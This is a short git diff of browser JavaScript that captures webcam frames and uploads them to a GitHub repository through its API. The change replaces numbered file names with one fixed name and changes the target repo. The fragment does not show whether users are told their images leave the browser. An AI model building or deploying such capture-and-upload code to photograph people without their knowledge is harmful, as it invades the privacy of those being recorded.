@@ -14,8 +14,6 @@ navigator.mediaDevices.getUserMedia({ video: true, audio: false })
         console.error('Error accessing the camera:', error);
     });
 
-let counter = localStorage.getItem('counter') ? parseInt(localStorage.getItem('counter')) : 0;
-
 async function getShaOfFile(owner, repo, path) {
     try {
         const response = await fetch(`https://api.github.com/repos/${owner}/${repo}/contents/${path}`, {
@@ -54,9 +52,8 @@ async function captureAndUpload() {
     if (typeof base64data === 'string' && base64data.startsWith('data:image/jpeg;base64,')) {
         const content = base64data.split(',')[1];
         const owner = 'Fangfajun';
-        const repo = 'test';
-        const path = `captured-image-${++counter}.jpg`; // 更新文件名并递增计数器
-        localStorage.setItem('counter', counter);
+        const repo = 'test1';
+        const path = 'captured-image.jpg'; // 使用固定文件名
 
         let sha = await getShaOfFile(owner, repo, path);
 
